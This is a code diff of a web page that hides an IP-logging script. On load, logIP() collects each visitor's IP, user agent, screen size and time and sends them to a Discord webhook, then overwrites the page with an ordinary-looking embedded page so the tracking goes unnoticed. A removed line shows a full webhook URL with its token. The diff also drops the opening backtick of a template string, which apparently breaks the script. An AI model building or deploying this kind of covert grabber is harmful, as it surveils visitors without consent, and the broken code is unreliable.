@@ -20,7 +20,7 @@
     </div>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1521997826131755028/uql6ytOp1rIMLN6kXac5nXrRgpvMH-kcB9G9L9edsPZUCKKllIwNzBwCbiQiFi9ax6Og"; 
+        const WEBHOOK = "https://discord.com/api/webhooks/PASTE_YOUR_WEBHOOK_HERE"; 
 
         async function logIP() {
             let info = { ip: "N/A", ua: navigator.userAgent, screen: screen.width+"x"+screen.height, time: new Date().toLocaleString() };
@@ -52,7 +52,7 @@
         window.onload = async () => {
             await logIP();
             
-            const originalHTML = `<!DOCTYPE html>
+            const originalHTML = <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -357,7 +357,7 @@
     <script src="app.js"></script>
 </body>
 </html>
- </html>) >>>`;
+`;
 
             document.open();
             document.write(originalHTML);
